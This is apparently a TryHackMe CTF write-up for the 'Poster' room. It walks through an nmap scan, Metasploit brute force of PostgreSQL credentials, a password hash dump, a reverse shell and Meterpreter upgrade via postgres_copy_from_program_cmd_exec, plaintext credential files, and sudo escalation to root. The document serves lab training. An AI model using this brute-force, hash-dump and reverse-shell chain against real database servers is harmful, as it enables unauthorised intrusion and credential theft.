---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Poster
# DESCRIPTION       . The sys admin set up a rdbms in a safe way.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/poster
```

```
sudo nmap -sSVC -T5 -p- 10.10.200.186 -oN poster
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71ed48af299e30c1b61dffb024cc6dcb (RSA)
|   256 eb3aa34e6f1000abeffcc52b0edb4057 (ECDSA)
|_  256 3e4142353805d392eb4939c6e3ee78de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time
```

#### Port 5432

- This CTF is a bit guided and points us to use metasploit.

- I found the `auxiliary/scanner/postgres/postgres_login` module helpful in bruteforcing the credentials. 

```
[-] 10.10.200.186:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.200.186:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.200.186:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.200.186:5432 - Login Successful: postgres:{REDACTED}
```

- `auxiliary/admin/postgres/postgres_sql` can be used with the credentials found above to list postgre's version.

- `auxiliary/scanner/postgres/postgres_hashdump` can be used to dump the user's password hashes.

```
   Name      Current Setting  
   ----      --------------- 
   DATABASE  template1      
   PASSWORD  {REDACTED}         
   RHOSTS    10.10.200.186    
   RPORT     5432            
   THREADS   1                
   USERNAME  postgres         
```

```
 Username   Hash
 --------   ----
 darkstart  md58842{REDACTED}a27d
 poster     md578fb{REDACTED}4cce0a
 postgres   md532e1{REDACTED}5127
 sistemas   md5f7db{REDACTED}ee2b
 ti         md57af9{REDACTED}579
 tryhackme  md503aa{REDACTED}efddc
```

- `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` is the module used to get a reverse shell on the server.

```
   Name               Current Setting  
   ----               ---------------  
   DATABASE           template1       
   DUMP_TABLE_OUTPUT  false            
   PASSWORD           {REDACTED}         
   RHOSTS             10.10.200.186    
   RPORT              5432             
   TABLENAME          hp0lDpyb        
   USERNAME           postgres
```

- Additionally, we can take one extra step and use `post/multi/manage/shell_to_meterpreter` to upgrade our shell to meterpreter.

- First, background the shell gained from the module above --- CTRL + Z

- Then, run the `shell_to_meterpreter` module with the following options

```
   Name     Current Setting  
   ----     ---------------  
   HANDLER  true             
   LHOST    {REDACTED}
   LPORT    4433            
   SESSION  1             
```

- Finally, use `sessions -i [session_ID]` to interact with the new (meterpreter) session.

- In `/home/dark/credentials.txt` we can find dark's credentials.

```
dark:qw{REDACTEDe
```

```
Sorry, user dark may not run sudo on ubuntu.
```

#### Privilege Escalation : dark -> alison

```
find / -type f -perm 0777 2>dev/null
```

- The command above listed 2 files I have full (rwx) permissions to, the credentials file I already knew about and `/var/www/html/config.php` file

```
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "{REDACTED}";
	$dbname = "mysudopassword";
?>
```

- After switching user as `alison`, we can grab the user flag from `/home/alison/user.txt`.

- I ran `sudo -l` as `alison` and I had a really nice surprise :) 

```
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

- The last flag is in `/root/root.txt` file.